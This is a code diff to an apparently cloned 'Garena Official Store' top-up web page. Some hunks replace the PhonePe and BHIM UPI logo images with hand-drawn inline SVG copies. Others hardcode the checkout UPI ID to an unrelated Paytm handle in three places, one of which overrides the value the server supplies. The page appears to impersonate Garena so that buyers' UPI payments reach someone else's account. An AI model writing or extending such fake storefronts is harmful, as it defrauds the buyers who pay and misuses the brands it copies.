@@ -1066,7 +1066,12 @@
           <!-- PhonePe Official -->
           <div style="display:flex;flex-direction:column;align-items:center;gap:3px;">
             <div style="width:44px;height:44px;border-radius:12px;background:#5f259f;border:1.5px solid #5f259f;box-shadow:0 2px 8px rgba(95,37,159,0.3);display:flex;align-items:center;justify-content:center;overflow:hidden;padding:4px;">
-              <img src="https://img.icons8.com/color/96/phonepe.png" alt="PhonePe" style="width:36px;height:36px;object-fit:contain;" onerror="this.src='https://img.icons8.com/fluency/96/phonepe.png'" />
+              <svg viewBox="0 0 60 60" width="36" height="36" xmlns="http://www.w3.org/2000/svg">
+                <rect width="60" height="60" rx="14" fill="#5f259f"/>
+                <text x="10" y="44" font-family="Arial Black, sans-serif" font-weight="900" font-size="34" fill="#ffffff">P</text>
+                <circle cx="38" cy="38" r="13" fill="#5f259f" stroke="#ffffff" stroke-width="2.5"/>
+                <text x="32" y="44" font-family="Arial Black, sans-serif" font-weight="900" font-size="18" fill="#ffffff">e</text>
+              </svg>
             </div>
             <span style="font-size:8px;font-weight:800;color:#5f259f;">PhonePe</span>
           </div>
@@ -1080,7 +1085,20 @@
           <!-- BHIM UPI Official -->
           <div style="display:flex;flex-direction:column;align-items:center;gap:3px;">
             <div style="width:44px;height:44px;border-radius:12px;background:#fff;border:1.5px solid #e2e8f0;box-shadow:0 2px 8px rgba(0,0,0,0.07);display:flex;align-items:center;justify-content:center;overflow:hidden;padding:4px;">
-              <img src="https://img.icons8.com/color/96/bhim-upi.png" alt="BHIM UPI" style="width:36px;height:36px;object-fit:contain;" onerror="this.src='https://upload.wikimedia.org/wikipedia/en/thumb/e/ef/BHIM_logo.png/240px-BHIM_logo.png'" />
+              <svg viewBox="0 0 60 60" width="36" height="36" xmlns="http://www.w3.org/2000/svg">
+                <rect width="60" height="60" rx="14" fill="#ffffff"/>
+                <!-- Orange Ashoka wheel top -->
+                <circle cx="30" cy="18" r="10" fill="none" stroke="#f97316" stroke-width="2.5"/>
+                <circle cx="30" cy="18" r="3" fill="#f97316"/>
+                <line x1="30" y1="8" x2="30" y2="28" stroke="#f97316" stroke-width="1.2"/>
+                <line x1="20" y1="18" x2="40" y2="18" stroke="#f97316" stroke-width="1.2"/>
+                <line x1="23" y1="11" x2="37" y2="25" stroke="#f97316" stroke-width="1.2"/>
+                <line x1="37" y1="11" x2="23" y2="25" stroke="#f97316" stroke-width="1.2"/>
+                <!-- BHIM text -->
+                <text x="30" y="43" font-family="Arial Black,sans-serif" font-weight="900" font-size="11" fill="#1e3a8a" text-anchor="middle">BHIM</text>
+                <!-- UPI text -->
+                <text x="30" y="55" font-family="Arial,sans-serif" font-weight="700" font-size="8" fill="#6b21a8" text-anchor="middle">UPI</text>
+              </svg>
             </div>
             <span style="font-size:8px;font-weight:800;color:#f26522;">BHIM</span>
           </div>
@@ -1608,9 +1626,9 @@
     const CONFIG_KEY = 'garena_clone_config';
     // DEFAULT_CONFIG contains only non-sensitive display defaults.
     // UPI ID and merchant name are loaded from server via syncAdminStore().
-    const DEFAULT_CONFIG = { upiId: 'garenatopup@nyes', merchantName: 'Garena Official Store' };
+    const DEFAULT_CONFIG = { upiId: 'paytm.s2sr8jx@pty', merchantName: 'Garena Official Store' };
     let activeConfig = { ...DEFAULT_CONFIG };
-    activeConfig.upiId = 'garenatopup@nyes';
+    activeConfig.upiId = 'paytm.s2sr8jx@pty';
     try {
       var savedCfg = JSON.parse(localStorage.getItem(CONFIG_KEY));
       if (savedCfg && savedCfg.merchantName) activeConfig.merchantName = savedCfg.merchantName;
@@ -1675,7 +1693,7 @@
             var st = (data && Array.isArray(data.products)) ? data : (data.state || data);
             if (st) {
               if (st.upiId) {
-                activeConfig.upiId = 'garenatopup@nyes';
+                activeConfig.upiId = 'paytm.s2sr8jx@pty';
                 if (st.merchantName) activeConfig.merchantName = st.merchantName;
                 localStorage.setItem(CONFIG_KEY, JSON.stringify(activeConfig));
               }
